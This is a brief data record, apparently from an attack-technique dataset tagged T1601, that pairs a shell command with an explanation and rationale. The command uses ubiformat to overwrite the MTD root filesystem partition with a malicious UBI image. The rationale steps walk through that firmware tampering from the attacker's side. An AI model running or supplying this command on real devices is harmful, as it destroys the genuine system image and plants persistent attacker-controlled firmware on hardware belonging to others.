command: echo 'T1601 patch: ubiformat rootfs partition'; ubiformat /dev/mtd5 -y -f /tmp/mal_rootfs.ubi && sync
explanation: Reformats and writes a malicious UBI-formatted rootfs image to the designated MTD partition, modifying the system image used at boot.
rationale_steps: Use ubiformat to safely erase/format the UBI-capable MTD partition.
Flash a crafted UBI image containing the attacker’s modified root filesystem.
Sync to ensure the new image is fully persisted.
